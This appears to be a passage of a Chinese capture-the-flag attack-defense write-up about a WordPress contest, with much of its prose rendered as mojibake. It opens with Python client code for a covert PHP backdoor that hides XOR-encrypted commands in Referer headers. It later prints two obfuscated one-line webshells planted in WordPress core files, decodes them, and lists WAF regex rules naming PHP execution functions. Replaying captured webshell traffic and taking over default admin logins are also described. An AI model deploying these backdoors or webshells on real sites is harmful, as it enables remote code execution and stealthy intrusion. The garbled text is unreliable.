debugPrint(\u0026#39;$i is %s\u0026#39; % (init2Char)) debugPrint(\u0026#39;md5 head: %s\u0026#39; % (md5head,)) debugPrint(\u0026#39;md5 tail: %s\u0026#39; % (md5tail,)) # Interactive php shell cmd = raw_input(\u0026#39;phpshell \u0026gt; \u0026#39;) while cmd != \u0026#39;\u0026#39;: # build junk data in referer query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) debugPrint(\u0026#39;Before insert payload:\u0026#39;) debugPrint(query) debugPrint(urllib.urlencode(query)) # encode payload payload = zlib.compress(cmd) payload = loopXor(payload,xorKey) payload = base64.urlsafe_b64encode(payload) payload = md5head + payload # cut payload, replace into referer cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 referer = url + \u0026#39;?\u0026#39; + urllib.urlencode(query) debugPrint(\u0026#39;After insert payload, referer is:\u0026#39;) debugPrint(query) debugPrint(referer) # send request r = sess.get(url,headers={\u0026#39;Accept-Language\u0026#39;:acceptLangStr,\u0026#39;Referer\u0026#39;:referer},proxies=proxies) html = r.text debugPrint(html) # process response pattern = re.compile(r\u0026#39;\u0026lt;%s\u0026gt;(.*)\u0026lt;/%s\u0026gt;\u0026#39; % (xorKey,xorKey)) output = pattern.findall(html) if len(output) == 0: print \u0026#39;Error, no backdoor response\u0026#39; cmd = raw_input(\u0026#39;phpshell \u0026gt; \u0026#39;) continue output = output[0] debugPrint(output) output = output.decode(\u0026#39;base64\u0026#39;) output = loopXor(output,xorKey) output = zlib.decompress(output) print output cmd = raw_input(\u0026#39;phpshell \u0026gt; \u0026#39;) ä¿®æ”¹ä¸€ä¸‹æ–‡ä¸­çš„khä¸kfå°±å¥½äº†ã€‚\nDay 2 æ‹¿åˆ°webæºç ï¼Œå‘ç°ç›®å½•ä¸‹æœ‰ä¸ª._wp-config.phpæ–‡ä»¶æ¯”è¾ƒå¥‡æ€ªï¼Œä¸€å¼€å§‹è®¤ä¸ºæ˜¯è‡ªå·±Macç”µè„‘çš„é—®é¢˜ï¼Œå°±æ²¡ç®¡äº†ã€‚ç°åœ¨æƒ³èµ·æ¥ï¼Œå¦‚æœæ²¡æœ‰ç»™å‡ºwp-config.phpï¼Œè²Œä¼¼è¿˜æ˜¯å¯ä»¥æ¢å¤çš„ï¼Œç„¶åå¾—åˆ°æ•°æ®åº“å¯†ç ï¼Œä½¿ç”¨nmapæ‰«ä¸€æ³¢çœ‹çœ‹å¤§å®¶çš„3306å¼€æ²¡å¼€ï¼Œç”¨é»˜è®¤çš„è´¦å·å¯†ç è¿æ¥æ•°æ®åº“ï¼Œç„¶åå†™shellï¼Œæˆ–è€…åˆ åº“é€ æˆå®•æœºã€‚å¯æƒœæœ¬æ¬¡æ¯”èµ›æ²¡æœ‰checkï¼ˆåçŸ¥åè§‰å‘ç°çš„ï¼‰ï¼Œå®•æœºåˆ åº“ä»€ä¹ˆçš„ä¹Ÿä¸å½±å“åˆ«äººâ€¦è€Œä¸”webç›®å½•ä¸å…·å¤‡writeæƒé™ï¼Œå°±æ¯”è¾ƒå°´å°¬äº†ã€‚\nèƒŒæ™¯ é¦–å…ˆè¯´ä¸€ä¸‹ç›®å‰æ™®éæµè¡ŒAWDçš„æ¨¡å¼ã€‚\n å‚èµ›é˜Ÿä¼åœ¨ç«èµ›è®¾ç½®çš„ç½‘ç»œç©ºé—´ä¸­ï¼ŒåŒæ—¶æ‰®æ¼”ç€æ”»å‡»è€…å’Œé˜²å®ˆè€…è§’è‰²ï¼Œäº’ç›¸è¿›è¡Œæ”»å‡»å’Œé˜²å®ˆã€‚\næ”»æ–¹ï¼Œé€šè¿‡æŒ–æ˜ç½‘ç»œæœåŠ¡æ¼æ´ï¼Œå¹¶æ”»å‡»å¯¹æ‰‹æœåŠ¡å¾—åˆ†ï¼›\nå®ˆæ–¹ï¼Œé€šè¿‡ä¿®è¡¥è‡ªèº«æœåŠ¡æ¼æ´æˆ–æ·»åŠ é˜²å¾¡ç­–ç•¥ï¼Œä»è€Œè¿›è¡Œé˜²å¾¡é¿å…ä¸¢åˆ†ã€‚\nä¼ ç»Ÿçš„AWDæ”»é˜²æ¨¡å¼é€šå¸¸æ˜¯ä»¥ä¸€ä¸ªSSHå¯¹åº”ä¸€ä¸ªå ¡å’æœºï¼Œå‚èµ›è€…é€šè¿‡SSHç™»é™†è‡ªå·±çš„æœåŠ¡å™¨ï¼Œè¿›è¡Œå®¡è®¡æ¼æ´ï¼Œä»è€Œä¿®è¡¥æ¼æ´é˜²å®ˆï¼Œæˆ–è€…é€šè¿‡æ¼æ´æ”»å‡»å…¶ä»–é˜Ÿä¼å¾—åˆ°åˆ†æ•°ã€‚\nä½†æ˜¯è¿™ä¸ªä¸–ç•Œä¸Šï¼Œæ€»æœ‰äººä¸æŒ‰å¸¸ç†å‡ºç‰Œï¼Œåˆ¶é€ æ¶æ„è¿è§„è¡Œä¸ºï¼Œ\næ¯”å¦‚ï¼š\nâ€œç›´æ¥å…³é—­ç½‘ç»œè¿æ¥ï¼Œå…³é—­ç½‘ç»œè®¿é—®â€\nâ€œè¿‡åº¦ä¿®æ”¹å ¡å’æœºï¼Œå¯¼è‡´ç½‘ç«™ä¸å¯æ­£å¸¸è®¿é—®â€\nâ€œç›´æ¥æ”»å‡»ç­”é¢˜å¹³å°ï¼Œè·å–é¢˜ç›®ä¿¡æ¯æˆ–ç¯¡æ”¹åˆ†æ•°â€\nâ€¦â€¦\nç›®å‰è¿™äº›é—®é¢˜å·²é€šè¿‡è§„åˆ™ã€å¥åº·æ£€æŸ¥ç­‰æ–¹å¼è¿›è¡Œè§„é¿ã€‚\nä½†æ˜¯ï¼ŒçœŸæ­£éš¾ä»¥è§£å†³çš„ä¸æ˜¯è¿™äº›è¿è§„ï¼Œè€Œæ˜¯ä¸€äº›**â€œä¸è¿è§„ï¼Œå´ä¸¥é‡å½±å“ç«èµ›ä½“éªŒâ€**çš„æƒ…å†µï¼Œå¦‚ã€é€šè¿‡ä½¿ç”¨ä¸€æ¬¡æ€§è„šæœ¬ç­‰ç°æˆå·¥å…·ï¼Œå°å µèµ›åœºç¯å¢ƒè®¾ç½®çš„å ¡å’æœºæ¼æ´ï¼Œå¯¼è‡´ç¯å¢ƒå¤±è¡¡ã€‘ã€‚\nåœ¨æŸç§æ„ä¹‰ä¸Šï¼Œä»–ä»¬å•æ–¹é¢æå‰å¹å“äº†â€œç»ˆæ­¢å“¨â€ï¼Œå…¶ä»–äººåˆä½•æ¥ç«æŠ€ä½“éªŒã€ç«æŠ€è¶£å‘³å‘¢ï¼Ÿ\n ä»¥å¾€çš„æ”»é˜²æ¯”èµ›ï¼Œé€‰æ‰‹å¯¹è‡ªå·±webç›®å½•æœ‰è¯»å†™çš„æƒåŠ›ï¼Œè¿™æ ·é€ æˆäº†æ¯”èµ›ä¸­éå¸¸å¤šçš„é€‰æ‰‹é€šè¿‡ä¸Šé€šé˜²ï¼ŒæŠ“æµé‡è®°å½•æ—¥å¿—ç­‰æŠ€å·§æ–¹å¼æ¥é˜²å®ˆæˆ–æ˜¯æ”»å‡»å¾—åˆ†ï¼Œå¹¶ä¸”å¾ˆå¤šé€‰æ‰‹é€šå¸¸é€šè¿‡ä¸€äº›â€œæŠ€å·§â€ï¼Œé€šè¿‡å¯¹æ¯”èµ›checkçš„ç»•è¿‡ï¼Œå…³é—­ä¸€äº›å…³é”®çš„æ­£å¸¸æœåŠ¡æˆ–è€…å…¨éƒ¨webç«™ç‚¹æœåŠ¡æ¥åœ¨æ¯”èµ›ä¸­â€œè‹Ÿâ€ä½ã€‚è¿™æ ·å¾€å¾€å¯¼è‡´äº†å¾ˆå¤šAWDæ¯”èµ›ä¸­webè¦ä¹ˆå°±æ˜¯è¢«æ‰“ç©¿ï¼Œè¦ä¹ˆå°±æ˜¯â€œå¤©è¡£æ— ç¼â€çš„æƒ…å†µï¼Œwebé€‰æ‰‹çš„æ¸¸æˆä½“éªŒåœ¨è¿‘æœŸæ”»é˜²æ¯”èµ›ä¸­æ¯å†µæ„ˆä¸‹ï¼Œä»¥ç½‘é¼æ¯webä¸ºä¾‹ï¼ŒåŠå†³èµ›è·Ÿå†³èµ›çš„checkåªæ£€æŸ¥äº†indexä¸»é¡µçš„å…³é”®å­—ï¼Œå¯¼è‡´äº†å¾ˆå¤šé˜Ÿä¼ä¸€å¼€å§‹å°±è¿›è¡Œäº†åˆ ç«™ï¼Œåªç•™ä¸ªindexä¸»é¡µæ¥é€šè¿‡checkï¼Œä¸¥é‡ç ´åäº†æ¯”èµ›ä½“éªŒã€‚\næ”¹å–„ï¼Ÿ ç®€è€Œè¨€ä¹‹å°±æ˜¯ï¼Œæœ¬æ¬¡æ¯”èµ›åœ¨ç†æƒ³è§„åˆ™ï¼ˆä¸ºå•¥æ˜¯ç†æƒ³è§„åˆ™ï¼Ÿå› ä¸ºè®¡åˆ’ä¸ç°å®å®Œå…¨æ˜¯ç†æƒ³å›¾ä¸å®ç‰©å›¾çš„å¯¹æ¯”ï¼‰æ”¹å˜äº†ä¼ ç»Ÿçš„webç±»å‹çš„æ”»é˜²æ¨¡å¼ï¼Œwebç›®å½•åªè¯»ä¸å¯å†™ï¼Œé€šè¿‡æ”¹å˜wafæ­£åˆ™é˜²å¾¡è§„åˆ™æ¥é˜²å¾¡æ”»å‡»ï¼Œæ”»å‡»ç‚¹å…¨é ä»£ç å®¡è®¡æ¥æ”»å‡»ï¼›pwnç±»å‹çš„ä¸ä¼ ç»Ÿæ”»é˜²ç›¸åŒã€‚ï¼ˆä»¥ä¸‹ä¸‰å¼ å›¾ç‰‡æ¥æºäºå§é¾™è‰å ‚å…¬ä¼—å·ï¼‰\n \n \n \nç°å®ï¼šèµ›å‰ ä¹ä¸€çœ‹æ˜¯å¾ˆä¸é”™çš„æ¯”èµ›ï¼Œä¸@Mioå¸ˆå‚…èŠäº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰æŒºä¸é”™çš„ã€‚ç„¶åå†³èµ›å‰ä¸€æ™šï¼Œæˆ‘å‡†å¤‡äº†æŒºå¤šçš„wafæ­£åˆ™è§„åˆ™ï¼Œåˆå‡†å¤‡äº†å¾ˆå¤šæ­£åˆ™çš„èµ„æ–™ï¼ˆå› ä¸ºæ¯”èµ›è¿‡ç¨‹ä¸å‡†è¿æ¥å¤–ç½‘ï¼‰ï¼Œå½“æ—¶è¿˜æœ‰ç‚¹æŒºæ‹…å¿ƒçš„ã€‚äº‹å®ä¸Šæˆ‘å¤šè™‘äº†\u0026hellip;\né¦–å…ˆä¸»åŠæ–¹æ¯”èµ›å‰åŠå°æ—¶å·¦å³å‘æ”¾äº†wafå¹³å°åœ°å€ï¼Œæ­£åˆ™è§„åˆ™éœ€è¦åœ¨wafå¹³å°ä¸Šé…ç½®ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ç»™æ€ä¹ˆä½¿ç”¨è¯¥å¹³å°çš„è¯´æ˜ï¼Œä¸è¿‡ä¹Ÿä¸æ˜¯å¾ˆéœ€è¦ï¼Œéšä¾¿ç‚¹ä¸€ç‚¹å°±å·®ä¸å¤šèƒ½äº†è§£æ•´ä¸ªå¹³å°çš„åŠŸèƒ½äº†ï¼Œä½†æ˜¯ä¸ç»™ä½¿ç”¨è¯´æ˜ä¹Ÿæœ‰ç‚¹å‘ï¼Œæœ‰äº›é˜Ÿä¼èµ›åæ‰çŸ¥é“åœ¨å“ªé‡Œé…wafè§„åˆ™ã€‚\nåŒæ—¶è¿˜å‘äº†webçš„åœ°å€ã€ä¸¤ä¸ªpwnçš„åœ°å€åŠpwnçš„sshå¯†ç ï¼Œå¹¶æ²¡æœ‰ç»™webæœåŠ¡å™¨çš„å¯†ç ã€‚åæ¥æ‰“å¼€ä¸€çœ‹åŸæ¥è¿˜æ˜¯ä¸ªwindows serverï¼Œé€‰æ‰‹ä»¬çš„åœ°å€éƒ½åœ¨172.16.10-40.13ã€‚æœ¬æ¬¡åªæœ‰ä¸€ä¸ªwebï¼Œä¸¤ä¸ªpwnï¼Œè€Œä¸”æ¯”è¾ƒæç¬‘çš„pwn2è¢«æ ‡æˆäº†pwn3ï¼Œè€Œä¸”æˆ‘ä»¬çš„pwnçš„sshå¯†ç è¿˜ä¸å¯¹ï¼Œå¯¼è‡´æˆ‘ä»¬è¿˜åœ¨å¼€èµ›åä¸€æ®µæ—¶é—´pwnçš„æœåŠ¡éƒ½è¿ä¸ä¸Šï¼Œè€½è¯¯äº†å¾ˆå¤šæ—¶é—´ã€‚webæ‰“å¼€å‘ç°æ˜¯ä¸ªwordpressï¼Œå¾ˆå¿«æ„è¯†åˆ°å»ç”¨wpscanï¼Œä½†æ˜¯æ¯”è¾ƒå¯æƒœçš„æ˜¯æ‰“å¼€æˆ‘çš„kaliå‘ç°wpscanå¹¶æ²¡æœ‰è”ç½‘å»ºç«‹ä»–çš„æ•°æ®åº“ï¼Œé¡¿æ—¶å°´å°¬ã€‚è¿˜å¥½æˆ‘çœ¼ç–¾æ‰‹å¿«ï¼Œè¿…é€Ÿåœ¨å¼€èµ›å‰åŸºæœ¬é…å¥½äº†å…³é”®å­—çš„`wafï¼Œé˜²ä½äº†åœ¨å¼€å§‹æ¯”èµ›å30minå·¦å³åŒ—èˆªç­‰é˜Ÿçš„æ”»å‡»ã€‚\nå¤§è‡´å½“æ—¶é…ç½®çš„wafè§„åˆ™ï¼š\nselect\\b|insert\\b|update\\b|drop\\b|delete\\b|dumpfile\\b|outfile\\b|load_file|rename\\b|floor\\(|extractvalue|updatexml|name_const|multipoint\\(/i /base64_decode|eval\\(|assert\\(/i |file_put_contents|fwrite|curl|system|eval|assert|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec ç°å®ï¼šèµ›æ—¶ å¼€èµ›å‰å‡ åˆ†é’Ÿï¼Œæˆ‘é©¬ä¸Šå°è¯•äº†admin/adminçš„å¼±å¯†ç å°è¯•ç™»å½•wordpressï¼Œå‘ç°æˆåŠŸç™»å½•ï¼Œç”±äºæ²¡æœ‰å‡†å¤‡æ‰¹é‡æ”¹å¯†ç çš„è„šæœ¬ï¼Œæˆ‘åªèƒ½é æ‰‹é€Ÿè¿…é€Ÿæ”¹æ‰äº†10ä¸ªé˜Ÿå·¦å³çš„adminå¯†ç ï¼Œä½†æ˜¯æ”¹å®Œåå‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä¼ ä¸äº†é©¬ï¼Œæ„è¯†åˆ°webç›®å½•ä¸å¯å†™ï¼Œé¡¿æ—¶ä¹Ÿæ„Ÿè§‰æœ‰ç‚¹å¯æƒœã€‚ä¹Ÿæµªè´¹äº†å¼€èµ›å‰å¾ˆå®è´µçš„åå¤šåˆ†é’Ÿåœ¨æ‰‹æ”¹å¯†ç ä¹‹ä¸Šã€‚\nç”±äºè‡ªå·±æ²¡å¸¦Dç›¾è¿™ä¸ªç¥å™¨ï¼Œä»¥ä¸ºè‡ªå·±ä¹Ÿèƒ½å…¨å±€æœä¸ªevalèƒ½æ‰¾å‡ºä¸€å¥è¯ï¼Œé«˜ä¼°äº†è‡ªå·±çš„å®¡è®¡é€Ÿåº¦ä»¥åŠcobraå®¡è®¡çš„é€Ÿåº¦ï¼ˆéå¸¸æ…¢\u0026hellip;)ï¼Œå¯¼è‡´æœ‰ä¸¤ä¸ªåŸæœ¬å¯ä»¥ç”¨Dç›¾æ‰«å‡ºæ¥çš„ä¸€å¥è¯æˆ‘ä»¬æ²¡æœ‰å¾ˆåŠæ—¶åœ°åˆ©ç”¨ï¼Œå¤±å»äº†å…ˆæœºï¼Œè„šæœ¬ä¹Ÿæ²¡æœ‰å‡†å¤‡å¥½ï¼Œå¯¼è‡´æ”¶åˆ°äº†æŸäº›é˜Ÿä¼æ‰“è¿‡æ¥çš„payloadä¹‹åï¼ˆè¿™é‡Œæä¸€ä¸‹ï¼Œåªæœ‰è¢«æ‹¦æˆªçš„è¯·æ±‚æ‰ä¼šæ˜¾ç¤ºåœ¨wafå¹³å°ä¸Šï¼Œå…¶ä»–æ²¡æœ‰è¢«æ‹¦æˆªçš„æ˜¯ä¸ä¼šæ˜¾ç¤ºçš„ï¼‰ï¼Œæ²¡æœ‰ç¬¬ä¸€æ—¶é—´è¿…é€Ÿåˆ©ç”¨èµ·æ¥ã€‚è€Œä¸”æ›´å‘çš„æ˜¯ï¼Œä¸»åŠæ–¹æ˜æ˜åœ¨è§„åˆ™ä¸Šå†™äº†ä½¿ç”¨curl FlagServer.comè·å–flagï¼Œç„¶è€ŒwebæœåŠ¡å™¨ä¸Šå‹æ ¹æ²¡é…å¤‡curlï¼Œç„¶åæˆ‘ä»¬å°±æƒ³ç ´è„‘ç­‹ï¼Œåœ¨æœ¬åœ°èµ„æ–™å„ç§æ‰¾ï¼Œæƒ³åŠæ³•å»è¯·æ±‚FlagServer.comï¼Œæ— è®ºæ˜¯php curl_execè¿˜æ˜¯windowsçš„ä»€ä¹ˆå…¶ä»–æ–¹æ³•éƒ½è¯•è¿‡äº†ï¼Œå½“æ—¶å¹¶æ²¡æœ‰æ‰“åˆ°å›æ˜¾ï¼Œä»¥è‡³äºæˆ‘ä»¬åœ¨æ‹¿åˆ°åˆ«äººshellä¹‹åçš„30minå·¦å³éƒ½æ²¡æœ‰åŠæ³•å¾—åˆ†ï¼Œå°±å¾ˆæ°”ï¼Œé”™è¿‡äº†éå¸¸å¤šçš„åˆ†æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬å½“æ—¶å¤„äºä¸€ä¸ªæ—¢æ²¡æœ‰è¢«æ‰“ï¼Œä¹Ÿæ‰“ä¸äº†åˆ«äººçš„æƒ…å†µã€‚\nç„¶åæˆ‘ä»¬å°±åˆ©ç”¨è‡ªå·±çš„pwnæœåŠ¡å™¨å°è¯•è‡ªå·±è®¿é—®è‡ªå·±çš„flagï¼Œå‘ç°ä¸æ˜¯å•çº¯çš„curl FlagServer.comè¿™ä¹ˆç®€å•ï¼Œä¸»åŠæ–¹è¿˜æ¯”è¾ƒå‘åœ°ç»™FlagServer.comé…äº†httpsï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—ä½¿ç”¨å®ƒçš„è¯ä¹¦ï¼Œç„¶ååˆæ‰¾äº†ä¸€écurl -hï¼Œåˆå»æ‰¾äº†ä¸€éè¯ä¹¦\u0026hellip;åæ­£è¿™é‡Œå°±å¾ˆå‘ã€‚è§‰å¾—æä¸å®šï¼Œå°±ç«‹é©¬å»é—®äº†ä¸»åŠæ–¹æ€ä¹ˆè¯·æ±‚flagï¼Œåœ¨ä»–ä»¬æœ‰ååº”ç»™æˆ‘ä»¬10minä¹‹å‰ï¼Œæˆ‘ä»¬ç»ˆäºåœ¨webæœåŠ¡å™¨çš„webæ ¹ç›®å½•çš„åŒçº§ç›®å½•ä¸‹æ‰¾åˆ°äº†curl.exeä»¥åŠç›¸å…³è¯ä¹¦ï¼Œè¿˜æœ‰ä¸€ä¸ªå·²ç»å†™å¥½å‘½ä»¤çš„batæ–‡ä»¶ã€‚æ­¤æ—¶æˆ‘ä»¬å¤§æ¦‚è¿‡å»äº†1hå·¦å³äº†â€¦åˆ«äººå·²ç»æ‰“äº†å¥½å‡ è½®äº†ã€‚\nå½“æ—¶å®Œæ•´çš„å‘½ä»¤æ˜¯è¿™æ ·çš„\u0026hellip;\ncurl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key ä¸­é—´è¿˜æœ‰ä¸ªå°æ’æ›²ï¼ŒæŠŠè‡ªå·±æäº¤flagå’ŒæŸ¥çœ‹æœåŠ¡çŠ¶æ€çš„é‚£ä¸ªå¹³å°å¯†ç ç»™å¿˜äº†â€¦åªèƒ½å»é—®ä¸»åŠæ–¹ï¼Œæœ€åå‘ç°ç«Ÿç„¶æ˜¯å¤§å°å†™é—®é¢˜ï¼Œåˆè€½è¯¯äº†å‡ åˆ†é’Ÿâ€¦ä¹‹å‰éƒ½æ²¡è¢«æ‰“ï¼Œä¹‹åä¸€ä¸Šæ¥å°±å‘ç°è‡ªå·±webè¢«æ‰“äº†ã€‚\nä¹‹åé€šè¿‡æˆ‘ä»¬é˜²å®ˆè·å–äº†å¾ˆå¤šé˜Ÿçš„payloadï¼Œæˆ‘ä»¬ä¹Ÿé€šè¿‡æŠ“å–èœåˆ€çš„æµé‡ï¼Œé‡æ”¾æ¥æ”»å‡»å…¶ä»–çš„é˜Ÿä¼ã€‚ç”±äºå½“æ—¶å¤§å®¶éƒ½å‘ç°äº†å¹¶æ²¡æœ‰checkæˆ–è€…checkå…¶ä»–ä¸€äº›å½¢åŒè™šè®¾çš„è®¾ç½®ï¼Œå¤§å®¶éƒ½æ¯”è¾ƒæ— èµ–äº†ï¼Œæ¯”è¾ƒå¤šçš„é˜Ÿä¼ç›´æ¥é…ç½®äº†.*è§„åˆ™ï¼Œæ‹¦æˆªäº†æ‰€æœ‰çš„è¯·æ±‚ã€‚æˆ‘ä»¬å½“æ—¶èƒ½æ”¶çš„ä¹Ÿæ²¡æœ‰å‡ ä¸ªé˜Ÿçš„åˆ†äº†ã€‚\nä¹‹åç¨³å®šåœ°é webæ‹¿äº†å‡ è½®åˆ†æ•°æ¥åˆ°äº†ç¬¬å…­ï¼Œæ„Ÿè§‰æ‹¿ä¸ªå¥–åº”è¯¥æ²¡ä»€ä¹ˆé—®é¢˜ã€‚å¯è°çŸ¥åŒ—èˆªç­‰é˜Ÿå‡ºäº†pwn1 pwn2çš„ä¸€è¡€ï¼Œæˆ‘ä»¬å°±å¼€å§‹è¢«æ‰“äº†ï¼Œè¢«æ‰“äº†ä¸é‡è¦ï¼Œä¿®å°±å®Œäº‹äº†ï¼Œç»“æœpwnè¿˜ä¸èƒ½ç»™patchï¼Œè¿™æ˜¯æœ€éªšçš„ï¼Œé—®ä¸»åŠæ–¹ä»–ä»¬ä¹Ÿç¡®å®å›ç­”ä¸ç»™patchï¼Œç»“æœæˆ‘ä»¬å°±åªèƒ½ä¸€ç›´è¢«æ‰“â€¦å°±å¾ˆæ°”â€¦è‡ªå·±é˜Ÿé‡Œä¹Ÿæ²¡æœ‰å‡ºpwnï¼Œå°±æ‰å‡ºäº†è·å¥–èŒƒå›´ã€‚\nèµ›æ—¶åº”è¯¥å°±è¿™ä¹ˆå¤šã€‚ä¸»è¦æ˜¯è¿™ä¸ªwafç³»ç»Ÿå¹¶æ²¡æœ‰æƒ³è±¡ä¸­é‚£ä¹ˆå¥½ï¼Œä»¥åŠä¸»åŠæ–¹å„ç§æ²¡æœ‰è¯´æ˜ï¼Œæ„Ÿè§‰ç›¸å½“çš„å‘ã€‚èµ›æ—¶å°±å†™è¿™ä¹ˆå¤šå§ã€‚è¿˜æ˜¯é‡ç‚¹æ¥çœ‹çœ‹èµ›åå¤ç›˜è¿™é‡Œã€‚\nDay\tN wordpressç‰ˆæœ¬æ˜¯æœ€æ–°çš„4.9.8ï¼ŒæœåŠ¡å™¨IISï¼Œä¸è¿‡æœåŠ¡å™¨ç‰ˆæœ¬å·å¿˜äº†ã€‚\nå¯¹æ¯”ä¹‹åå·®å¼‚ä¸€ç›®äº†ç„¶\n \nä¸»è¦æ˜¯ä¸¤ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä»¥åŠ4ä¸ªæ’ä»¶ã€‚\nWebshell Poc\t1 wordpress/wp-includes/customize/class-wp-customize-background-image-list.php\n\u0026lt;?php @$_ = \u0026#34;s\u0026#34; . \u0026#34;s\u0026#34; . /*-/*-*/\u0026#34;e\u0026#34; . /*-/*-*/\u0026#34;r\u0026#34;; @$_ = /*-/*-*/\u0026#34;a\u0026#34; . /*-/*-*/$_ . /*-/*-*/\u0026#34;t\u0026#34;; @$_/*-/*-*/($/*-/*-*/{\u0026#34;_P\u0026#34; . /*-/*-*/\u0026#34;OS\u0026#34; . /*-/*-*/\u0026#34;T\u0026#34;} [0 - /*-/*-*/2/*-/*-*/ - /*-/*-*/5/*-/*-*/]); è¿™ä¸ªå¾ˆæ˜æ˜¾æ˜¯ä¸ªassertçš„ä¸€å¥è¯ï¼Œä½†æ˜¯èµ›æ—¶æˆ‘ä»¬æœ¬åœ°æµ‹è¯•è€æ˜¯ä¸è¡Œï¼Œæ€»æ˜¯å‡ºç°\nWarning: Cannot call assert() with string argument dynamically in /xxx/shell.php on line 5 åæ¥æœäº†ä¸€ä¸‹å‘ç°ç«Ÿç„¶æ˜¯phpç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œå› ä¸ºåœ¨php7ä¸­åŠ¨æ€è°ƒç”¨ä¸€äº›å‡½æ•°æ˜¯è¢«ç¦æ­¢çš„ã€‚è¯¦ç»†å‚è€ƒèœåˆ€è¿æ¥phpä¸€å¥è¯æœ¨é©¬è¿”å›200çš„åŸå› åŠè§£å†³æ–¹æ³•\nè¿™é‡Œæ˜¯ä¸ªå¯†ç ä¸º-7çš„ä¸€å¥è¯ã€‚\n \nPoc\t2 wordpress-awd/wp-includes/pomo/tp.php\n\u0026lt;?php ${(\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;)} = (\u0026#34;!\u0026#34; ^ \u0026#34;`\u0026#34;) . (\u0026#34;( \u0026#34; ^ \u0026#34;{\u0026#34;) . (\u0026#34;(\u0026#34; ^ \u0026#34;[\u0026#34;) . (\u0026#34;~\u0026#34; ^ \u0026#34;;\u0026#34;) . (\u0026#34;|\u0026#34; ^ \u0026#34;.\u0026#34;) . (\u0026#34;*\u0026#34; ^ \u0026#34;~\u0026#34;); @${(\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;)}((\u0026#34;-\u0026#34; ^ \u0026#34;H\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;+\u0026#34;) . (\u0026#34;[\u0026#34; ^ \u0026#34;:\u0026#34;) . (\u0026#34;,\u0026#34; ^ \u0026#34;@\u0026#34;) . (\u0026#34;}\u0026#34; ^ \u0026#34;U\u0026#34;) . (\u0026#34;~\u0026#34; ^ \u0026#34;\u0026gt;\u0026#34;) . (\u0026#34;e\u0026#34; ^ \u0026#34;A\u0026#34;) . (\u0026#34;(\u0026#34; ^ \u0026#34;w\u0026#34;) . (\u0026#34;j\u0026#34; ^ \u0026#34;:\u0026#34;) . (\u0026#34;i\u0026#34; ^ \u0026#34;\u0026amp;\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;p\u0026#34;) . (\u0026#34;\u0026gt;\u0026#34; ^ \u0026#34;j\u0026#34;) . (\u0026#34;!\u0026#34; ^ \u0026#34;z\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;\u0026gt;\u0026#34;) . (\u0026#34;@\u0026#34; ^ \u0026#34;-\u0026#34;) . (\u0026#34;[\u0026#34; ^ \u0026#34;?\u0026#34;) . (\u0026#34;?\u0026#34; ^ \u0026#34;b\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;t\u0026#34;)); è¿™é‡Œæ˜¯ç¬¬äºŒä¸ªä¸€å¥è¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡var_dumpæ¥çœ‹çœ‹è¿™ä¸ªçš„å¯†ç æ˜¯ä»€ä¹ˆã€‚\nphp \u0026gt; echo (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;); __ php \u0026gt; var_dump(${(\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;)}); string(6) \u0026#34;ASsERT\u0026#34; php \u0026gt; echo (\u0026#34;-\u0026#34; ^ \u0026#34;H\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;+\u0026#34;) . (\u0026#34;[\u0026#34; ^ \u0026#34;:\u0026#34;) . (\u0026#34;,\u0026#34; ^ \u0026#34;@\u0026#34;) . (\u0026#34;}\u0026#34; ^ \u0026#34;U\u0026#34;) . (\u0026#34;~\u0026#34; ^ \u0026#34;\u0026gt;\u0026#34;) . (\u0026#34;e\u0026#34; ^ \u0026#34;A\u0026#34;) . (\u0026#34;(\u0026#34; ^ \u0026#34;w\u0026#34;) . (\u0026#34;j\u0026#34; ^ \u0026#34;:\u0026#34;) . (\u0026#34;i\u0026#34; ^ \u0026#34;\u0026amp;\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;p\u0026#34;) . (\u0026#34;\u0026gt;\u0026#34; ^ \u0026#34;j\u0026#34;) . (\u0026#34;!\u0026#34; ^ \u0026#34;z\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;\u0026gt;\u0026#34;) . (\u0026#34;@\u0026#34; ^ \u0026#34;-\u0026#34;) . (\u0026#34;[\u0026#34; ^ \u0026#34;?\u0026#34;) . (\u0026#34;?\u0026#34; ^ \u0026#34;b\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;t\u0026#34;); eval(@$_POST[cmd]) è¿™é‡Œå°±éå¸¸æ¸…æ¥šäº†ï¼Œæ˜¯ä¸ªå¯†ç ä¸ºcmdçš„ä¸€å¥è¯ã€‚\n \nPlugin 